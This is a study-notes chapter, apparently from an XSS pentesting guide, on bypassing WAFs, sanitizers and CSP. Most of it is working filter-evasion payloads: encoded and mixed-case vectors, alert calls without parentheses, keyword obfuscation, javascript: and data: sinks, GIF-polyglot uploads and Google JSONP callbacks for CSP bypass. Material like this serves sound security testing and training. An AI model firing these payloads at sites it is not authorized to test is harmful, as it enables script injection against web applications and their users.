# Section 3: Filter Bypass — Evading WAFs, Sanitizers & CSP

## Core Idea
Filters fail on edge cases: case sensitivity, double-decoding, missing chars, tag-name allowlists, regex blind spots. Diagnose *what* the filter blocks, then pick the bypass class that removes exactly that dependency.

## Frameworks Introduced
- **Constraint-driven bypass**: identify the blocked primitive (parens, `>`, keywords, alphabetic chars, tag names, event handlers, quotes, spaces) → select the technique that eliminates it
- **Encoding escalation ladder**: none → mixed case → URL-encode → double-encode → HTML entities → JS escapes (octal/hex/unicode) → regex-source tricks
- **Agnostic vectors**: when tag names are filtered, arbitrary `<x on*>` elements with `contenteditable`/`onfocus` still work — any alphabetic tag name executes

## Key Concepts
- **Mixed case / uppercase**: beats case-sensitive filters; use `&#97...` entities when input is force-uppercased
- **Unclosed tags**: `<svg onload=alert(1)//` bypasses `<`+`>` pair detection (needs native `>` after reflection)
- **Double-encoded**: `%253C` survives a second decode pass
- **No-paren alerts**: `` alert`1` ``, `setInterval`alert\x28...\x29` ``, `<svg onload=alert&lpar;1&rpar;>`
- **No-alphabetic**: JS octal escapes inside string indexing — `[]['\146\151...']['\143...']('\141...')()`
- **Alert obfuscation**: `(alert)(1)`, `a=alert,a(1)`, `[1].find(alert)`, `top["al"+"ert"](1)`, `top[/al/.source+/ert/.source](1)`, `al\u0065rt(1)`, `top[8680439..toString(30)](1)`
- **GIF disguise upload**: `GIF89a=//<script>alert(1)//</script>;` saved as `.gif`/`.js` bypasses MIME checks → CSP bypass via upload
- **URL fragment**: `eval(location.hash.slice(1)) #alert(1)` hides payload from server-side/WAF inspection
- **Alternative separators**: space banned → `%09 %0A %0C %0D / +` between tag/attr/handler positions
- **Strip-tags bypass**: inline `o<x>nmouseover=alert<x>(1)//` survives `<...>` stripping
- **2nd-order XSS**: `&lt;svg/onload&equals;alert(1)&gt;` fires when stored input is decoded then re-inserted
- **postMessage origin bypass**: prepend allowed origin as subdomain of attacker domain (`facebook.com.localhost`)
- **CSP bypass (whitelisted Google)**: JSONP endpoints `google.com/complete/search?client=chrome&jsonp=alert(1);` + AngularJS ng-csp payload

## Code Examples

Case/encoding bypasses:
```html
<Svg OnLoad=alert(1)>
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<script/x>alert(1)</script>
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
```

No-parentheses alerts:
```js
alert`1`
setInterval`alert\x28document.domain\x29`
<svg onload=alert&#40;1&#41>
```

Regex filter obfuscation:
```js
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
```

No-event-handler vectors (partial list):
```html
<script>alert(1)</script>
<script src=data:,alert(1)>
<iframe src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>click
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<svg><script xlink:href=data:,alert(1) />
```

Agnostic tag-name handlers (any `<x>` works, needs interaction):
```html
<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x onmouseover=alert(1)>hover this!
<x contenteditable onpaste=alert(1)>paste here!
```

Alternative JS comments & separators:
```html
<!--            (JS comment alternative)
%0A-->
<name%0Aattrib%0A=%0Avalue%0Ahandler%0A=%0Ajs>
```

## Reference Tables

HTML separator alternatives (when space/`=` context filtered):
| Position | Allowed alternatives |
|----------|---------------------|
| tag↔attr, attr↔`=`, handler↔`=` | `%09 %0A %0C %0D %20 / +` |
| around `=` in attributes | `%09 %0A %0C %0D %20 + ' "` |
| `=`↔handler, handler↔js | `%09 %0A %0B %0C %0D %20 / + ' "` |

## Anti-patterns
- **Retrying blocked chars**: if `(` is stripped, don't mutate elsewhere — switch to backtick/`&lpar;` form.
- **Forgetting interaction requirement**: agnostic `<x on*>` vectors need user interaction — flag in report.
- **WAF-visible payloads**: move payload into `#fragment` when server-side inspection blocks it.

## Key Takeaways
1. Name the exact blocked primitive, then pick the bypass that removes it — don't fuzz randomly.
2. `top[...]`/`window`/`self` bracket-notation kills most keyword regexes.
3. `data:`/`javascript:`/`srcdoc`/`xlink:href` sinks dodge script-tag blocklists.
4. CSP whitelisting Google domains is exploitable via JSONP `jsonp=` callbacks.
5. Stored/2nd-order flows decode entities later — submit `&lt;...&gt;` where direct vectors die.

## Connects To
- **ch01-basics**: start here; escalate when vectors are stripped
- **ch05-miscellaneous**: ASCII encoding table for entity/escape conversions
